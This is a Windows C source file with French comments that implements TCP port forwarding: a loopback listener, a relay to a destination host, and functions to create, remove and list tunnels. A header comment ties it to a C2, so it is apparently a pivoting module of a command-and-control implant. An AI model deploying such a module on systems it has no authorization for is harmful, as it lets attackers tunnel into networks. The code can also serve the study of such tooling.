/*
 * portfwd.c - Port Forwarding
 *
 * Permet de créer des tunnels de ports :
 * - Local → Distant : écoute sur un port local et forward vers une cible distante
 * - Distant → Local : (via le C2) reçoit des connexions et les forward localement
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "ws2_32.lib")

#include "../../include/common.h"

/* Config */

#define PORTFWD_BUFFER_SIZE   8192
#define MAX_PORT_FORWARDS     10

/* Data structures */

typedef struct {
    int id;
    SOCKET listenSocket;
    char destHost[256];
    USHORT destPort;
    USHORT localPort;
    BOOL active;
    HANDLE thread;
} PortForward;

static PortForward g_forwards[MAX_PORT_FORWARDS] = {0};
static int g_nextId = 1;
static CRITICAL_SECTION g_cs;
static BOOL g_csInit = FALSE;

/* Relay thread */

typedef struct {
    SOCKET clientSocket;
    SOCKET remoteSocket;
} RelayContext;

static DWORD WINAPI PortFwdRelayThread(LPVOID param) {
    RelayContext* ctx = (RelayContext*)param;
    
    fd_set readSet;
    char buffer[PORTFWD_BUFFER_SIZE];
    
    while (TRUE) {
        FD_ZERO(&readSet);
        FD_SET(ctx->clientSocket, &readSet);
        FD_SET(ctx->remoteSocket, &readSet);
        
        struct timeval timeout;
        timeout.tv_sec = 1;
        timeout.tv_usec = 0;
        
        SOCKET maxSock = max(ctx->clientSocket, ctx->remoteSocket);
        int result = select((int)maxSock + 1, &readSet, NULL, NULL, &timeout);
        
        if (result <= 0) continue;
        
        // Client -> Remote
        if (FD_ISSET(ctx->clientSocket, &readSet)) {
            int received = recv(ctx->clientSocket, buffer, sizeof(buffer), 0);
            if (received <= 0) break;
            
            int sent = send(ctx->remoteSocket, buffer, received, 0);
            if (sent <= 0) break;
        }
        
        // Remote -> Client
        if (FD_ISSET(ctx->remoteSocket, &readSet)) {
            int received = recv(ctx->remoteSocket, buffer, sizeof(buffer), 0);
            if (received <= 0) break;
            
            int sent = send(ctx->clientSocket, buffer, received, 0);
            if (sent <= 0) break;
        }
    }
    
    closesocket(ctx->clientSocket);
    closesocket(ctx->remoteSocket);
    free(ctx);
    
    return 0;
}

/* Listener thread */

static DWORD WINAPI PortFwdListenThread(LPVOID param) {
    PortForward* pf = (PortForward*)param;
    
    while (pf->active) {
        struct sockaddr_in clientAddr;
        int clientAddrLen = sizeof(clientAddr);
        
        SOCKET clientSocket = accept(pf->listenSocket, (struct sockaddr*)&clientAddr, &clientAddrLen);
        if (clientSocket == INVALID_SOCKET) {
            if (!pf->active) break;
            continue;
        }
        
        // Connecte à la destination
        struct addrinfo hints = {0}, *result = NULL;
        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        
        char portStr[16];
        snprintf(portStr, sizeof(portStr), "%u", pf->destPort);
        
        if (getaddrinfo(pf->destHost, portStr, &hints, &result) != 0) {
            closesocket(clientSocket);
            continue;
        }
        
        SOCKET remoteSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (remoteSocket == INVALID_SOCKET) {
            freeaddrinfo(result);
            closesocket(clientSocket);
            continue;
        }
        
        if (connect(remoteSocket, result->ai_addr, (int)result->ai_addrlen) != 0) {
            closesocket(remoteSocket);
            freeaddrinfo(result);
            closesocket(clientSocket);
            continue;
        }
        
        freeaddrinfo(result);
        
        // Crée le thread de relais
        RelayContext* ctx = (RelayContext*)malloc(sizeof(RelayContext));
        if (!ctx) {
            closesocket(clientSocket);
            closesocket(remoteSocket);
            continue;
        }
        
        ctx->clientSocket = clientSocket;
        ctx->remoteSocket = remoteSocket;
        
        HANDLE relayThread = CreateThread(NULL, 0, PortFwdRelayThread, ctx, 0, NULL);
        if (relayThread) {
            CloseHandle(relayThread);
        } else {
            closesocket(clientSocket);
            closesocket(remoteSocket);
            free(ctx);
        }
    }
    
    return 0;
}

/* Public API */

/*
 * Initialise le module port forward.
 */
void PortFwd_Init(void) {
    if (!g_csInit) {
        InitializeCriticalSection(&g_cs);
        g_csInit = TRUE;
        
        // Initialise Winsock
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);
    }
}

/*
 * Crée un port forward local → distant.
 * localPort: port d'écoute local
 * destHost: hôte destination
 * destPort: port destination
 * Retourne l'ID du forward ou 0 en cas d'erreur.
 */
int PortFwd_Create(USHORT localPort, const char* destHost, USHORT destPort) {
    if (!destHost || !*destHost) return 0;
    
    PortFwd_Init();
    
    EnterCriticalSection(&g_cs);
    
    // Trouve un slot libre
    PortForward* pf = NULL;
    for (int i = 0; i < MAX_PORT_FORWARDS; i++) {
        if (!g_forwards[i].active) {
            pf = &g_forwards[i];
            break;
        }
    }
    
    if (!pf) {
        LeaveCriticalSection(&g_cs);
        return 0;
    }
    
    // Crée le socket d'écoute
    pf->listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (pf->listenSocket == INVALID_SOCKET) {
        LeaveCriticalSection(&g_cs);
        return 0;
    }
    
    // Bind
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_port = htons(localPort);
    
    if (bind(pf->listenSocket, (struct sockaddr*)&addr, sizeof(addr)) != 0) {
        closesocket(pf->listenSocket);
        LeaveCriticalSection(&g_cs);
        return 0;
    }
    
    // Récupère le port effectif
    int addrLen = sizeof(addr);
    getsockname(pf->listenSocket, (struct sockaddr*)&addr, &addrLen);
    pf->localPort = ntohs(addr.sin_port);
    
    // Listen
    if (listen(pf->listenSocket, 5) != 0) {
        closesocket(pf->listenSocket);
        LeaveCriticalSection(&g_cs);
        return 0;
    }
    
    // Configure le forward
    pf->id = g_nextId++;
    strncpy(pf->destHost, destHost, sizeof(pf->destHost) - 1);
    pf->destPort = destPort;
    pf->active = TRUE;
    
    // Lance le thread d'écoute
    pf->thread = CreateThread(NULL, 0, PortFwdListenThread, pf, 0, NULL);
    if (!pf->thread) {
        closesocket(pf->listenSocket);
        pf->active = FALSE;
        LeaveCriticalSection(&g_cs);
        return 0;
    }
    
    LeaveCriticalSection(&g_cs);
    return pf->id;
}

/*
 * Supprime un port forward.
 */
BOOL PortFwd_Remove(int id) {
    if (!g_csInit) return FALSE;
    
    EnterCriticalSection(&g_cs);
    
    for (int i = 0; i < MAX_PORT_FORWARDS; i++) {
        if (g_forwards[i].active && g_forwards[i].id == id) {
            g_forwards[i].active = FALSE;
            
            if (g_forwards[i].listenSocket != INVALID_SOCKET) {
                closesocket(g_forwards[i].listenSocket);
                g_forwards[i].listenSocket = INVALID_SOCKET;
            }
            
            if (g_forwards[i].thread) {
                WaitForSingleObject(g_forwards[i].thread, 2000);
                CloseHandle(g_forwards[i].thread);
                g_forwards[i].thread = NULL;
            }
            
            LeaveCriticalSection(&g_cs);
            return TRUE;
        }
    }
    
    LeaveCriticalSection(&g_cs);
    return FALSE;
}

/*
 * Liste les port forwards actifs.
 * Retourne un JSON avec les infos.
 */
BOOL PortFwd_List(char** outJson) {
    if (!outJson) return FALSE;
    *outJson = NULL;
    
    PortFwd_Init();
    
    char* json = (char*)malloc(4096);
    if (!json) return FALSE;
    
    EnterCriticalSection(&g_cs);
    
    int offset = snprintf(json, 4096, "{\n  \"forwards\": [\n");
    
    BOOL first = TRUE;
    for (int i = 0; i < MAX_PORT_FORWARDS; i++) {
        if (g_forwards[i].active) {
            if (!first) {
                offset += snprintf(json + offset, 4096 - offset, ",\n");
            }
            first = FALSE;
            
            offset += snprintf(json + offset, 4096 - offset,
                "    {\"id\": %d, \"local_port\": %u, \"dest\": \"%s:%u\"}",
                g_forwards[i].id,
                g_forwards[i].localPort,
                g_forwards[i].destHost,
                g_forwards[i].destPort);
        }
    }
    
    snprintf(json + offset, 4096 - offset, "\n  ]\n}");
    
    LeaveCriticalSection(&g_cs);
    
    *outJson = json;
    return TRUE;
}

/*
 * Cleanup du module.
 */
void PortFwd_Cleanup(void) {
    if (!g_csInit) return;
    
    EnterCriticalSection(&g_cs);
    
    for (int i = 0; i < MAX_PORT_FORWARDS; i++) {
        if (g_forwards[i].active) {
            g_forwards[i].active = FALSE;
            
            if (g_forwards[i].listenSocket != INVALID_SOCKET) {
                closesocket(g_forwards[i].listenSocket);
            }
            
            if (g_forwards[i].thread) {
                WaitForSingleObject(g_forwards[i].thread, 2000);
                CloseHandle(g_forwards[i].thread);
            }
        }
    }
    
    LeaveCriticalSection(&g_cs);
    DeleteCriticalSection(&g_cs);
    g_csInit = FALSE;
    
    WSACleanup();
}
